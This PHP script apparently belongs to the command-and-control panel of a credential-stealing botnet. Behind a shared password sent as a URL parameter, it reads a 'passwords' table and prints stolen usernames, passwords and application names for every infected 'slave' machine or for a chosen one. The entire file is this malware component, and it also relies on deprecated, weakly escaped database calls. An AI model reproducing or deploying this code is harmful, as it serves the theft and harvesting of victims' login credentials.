<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
//-------------------------------------------
if(isset($_GET['client']))
{
$passwords = $_GET['password'];
if($passwords == $passwordc) 
{
$slave_id = $_GET['id'];
$slave_id = htmlentities($slave_id);
$slave_id = mysql_escape_string($slave_id);
if (!isset($_GET['id']))
{
$querry_secs = "SELECT slave_id, username, password, application FROM passwords";
$result4 = mysql_query($querry_secs, $connect);
while($row = mysql_fetch_array($result4) ){
 $slave_id = $row[0];
 $username = $row[1];
 $password = $row[2];
 $application = $row[3];
 echo $slave_id."~".$username."~".$password."~".$application."<br>";
}
}
elseif(isset($_GET['id']))
{
$querry_secs = "SELECT slave_id, username, password, application FROM passwords WHERE slave_id='$slave_id'";
$result4 = mysql_query($querry_secs, $connect);
while($row = mysql_fetch_array($result4) ){
 $slave_id = $row[0];
 $username = $row[1];
 $password = $row[2];
 $application = $row[3];
 echo $slave_id."~".$username."~".$password."~".$application."<br>";
}
}
}
}
?>